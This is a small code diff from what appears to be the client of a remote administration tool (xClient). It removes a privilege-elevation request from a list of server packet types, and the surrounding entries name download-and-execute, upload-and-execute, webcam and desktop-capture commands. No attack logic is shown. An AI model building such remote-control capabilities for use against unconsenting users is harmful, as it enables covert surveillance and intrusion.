@@ -16,7 +16,6 @@ namespace xClient.Core.Packets
                 typeof (Packets.ServerPackets.DoClientReconnect),
                 typeof (Packets.ServerPackets.DoClientUninstall),
                 typeof (Packets.ServerPackets.DoWebcamStop),
-                typeof (Packets.ServerPackets.DoAskElevate),
                 typeof (Packets.ServerPackets.DoDownloadAndExecute),
                 typeof (Packets.ServerPackets.DoUploadAndExecute),
                 typeof (Packets.ServerPackets.GetDesktop),
